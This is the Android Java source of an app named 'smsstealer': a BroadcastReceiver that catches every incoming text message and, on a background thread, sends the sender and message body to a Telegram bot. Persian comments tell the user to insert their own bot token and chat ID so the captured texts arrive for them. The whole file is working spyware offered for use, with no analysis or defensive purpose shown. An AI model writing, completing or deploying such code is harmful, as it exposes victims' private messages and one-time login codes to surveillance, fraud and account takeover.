package com.example.smsstealer;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class SmsReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = smsMessage.getDisplayOriginatingAddress();
                        String messageBody = smsMessage.getMessageBody();

                        // ارسال اطلاعات به تلگرام یا سرور شما به صورت پس‌زمینه
                        sendDataToServer(sender, messageBody);
                    }
                }
            }
        }
    }

    private void sendDataToServer(String sender, String message) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // اطلاعات ربات تلگرام خودت رو اینجا جایگزین کن تا پیامک‌ها مستقیم بیان برای خودت
                    String botToken = "YOUR_BOT_TOKEN_HERE";
                    String chatId = "YOUR_CHAT_ID_HERE";
                    String text = "New SMS Captured!\nFrom: " + sender + "\nMessage: " + message;
                    
                    String urlString = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + java.net.URLEncoder.encode(text, "UTF-8");
                    
                    URL url = new URL(urlString);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");
                    conn.getInputStream();
                    conn.disconnect();
                } catch (Exception e) {
                    Log.e("SmsReceiver", "Error sending SMS", e);
                }
            }
        }).start();
    }
}
